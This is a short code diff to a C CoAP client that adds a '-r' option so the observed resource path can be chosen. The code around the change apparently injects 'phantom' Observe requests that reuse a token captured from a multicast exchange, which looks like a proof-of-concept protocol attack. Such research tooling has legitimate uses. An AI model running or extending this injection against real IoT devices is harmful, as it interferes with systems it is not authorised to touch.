@@ -101,10 +101,11 @@ static coap_response_t hnd_response(coap_session_t *session,
 int main(int argc, char *argv[]) {
     const char *host = DEFAULT_HOST;
     int port = DEFAULT_PORT;
+    const char *resource_path = "obs";
     int use_oscore = 0;
     int opt;
 
-    while ((opt = getopt(argc, argv, "sh:p:")) != -1) {
+    while ((opt = getopt(argc, argv, "sh:p:r:")) != -1) {
         switch (opt) {
             case 's':
                 use_oscore = 1;
@@ -115,8 +116,11 @@ int main(int argc, char *argv[]) {
             case 'p':
                 port = atoi(optarg);
                 break;
+            case 'r':
+                resource_path = optarg;
+                break;
             default:
-                fprintf(stderr, "Usage: %s [-s] [-h host] [-p port]\n", argv[0]);
+                fprintf(stderr, "Usage: %s [-s] [-h host] [-p port] [-r resource_path]\n", argv[0]);
                 exit(EXIT_FAILURE);
         }
     }
@@ -184,10 +188,10 @@ int main(int argc, char *argv[]) {
     size_t obs_len = coap_encode_var_safe(obs_buf, sizeof(obs_buf), 0);
     coap_add_option(pdu, COAP_OPTION_OBSERVE, obs_len, obs_buf);
 
-    // Add Uri-Path option: "obs"
-    coap_add_option(pdu, COAP_OPTION_URI_PATH, 3, (const uint8_t *)"obs");
+    // Add Uri-Path option: resource_path
+    coap_add_option(pdu, COAP_OPTION_URI_PATH, strlen(resource_path), (const uint8_t *)resource_path);
 
-    printf("Sending unicast registration GET request to coap://%s:%d/obs (Observe=0)...\n", host, port);
+    printf("Sending unicast registration GET request to coap://%s:%d/%s (Observe=0)...\n", host, port, resource_path);
     if (coap_send(unicast_session, pdu) == COAP_INVALID_MID) {
         fprintf(stderr, "Failed to send registration GET request\n");
         coap_session_release(unicast_session);
@@ -257,8 +261,8 @@ int main(int argc, char *argv[]) {
             // Add Observe option
             coap_add_option(phantom_pdu, COAP_OPTION_OBSERVE, obs_len, obs_buf);
 
-            // Add Uri-Path option: "obs"
-            coap_add_option(phantom_pdu, COAP_OPTION_URI_PATH, 3, (const uint8_t *)"obs");
+            // Add Uri-Path option: resource_path
+            coap_add_option(phantom_pdu, COAP_OPTION_URI_PATH, strlen(resource_path), (const uint8_t *)resource_path);
 
             printf("Injecting phantom observe request with token 0x");
             for (size_t i = 0; i < mcast_tp.token_len; i++) {
